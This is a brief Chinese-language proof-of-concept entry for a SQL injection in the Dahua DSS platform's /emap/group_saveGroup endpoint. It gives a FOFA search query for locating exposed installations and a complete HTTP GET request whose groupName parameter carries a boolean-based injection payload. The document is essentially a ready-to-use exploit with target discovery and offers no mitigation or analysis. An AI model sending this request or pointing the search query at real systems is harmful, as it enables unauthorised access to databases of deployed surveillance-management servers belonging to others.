# 大华DSS系统group_saveGroup存在SQL注入漏洞



## fofa

```yaml
app="dahua-DSS"
```

## poc

```javascript
GET /emap/group_saveGroup?groupName=1'%20and%202333=2333%20and%20'hami'='hami&groupDesc=1 HTTP/1.1
Host: xx.xx.xx.xx
Accept-Encoding: identity
Accept-Language: zh-CN,zh;q=0.8
Accept: */*
User-Agent: Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0 info
Accept-Charset: GBK,utf-8;q=0.7,*;q=0.3
Connection: keep-alive
Cache-Control: max-age=0
```

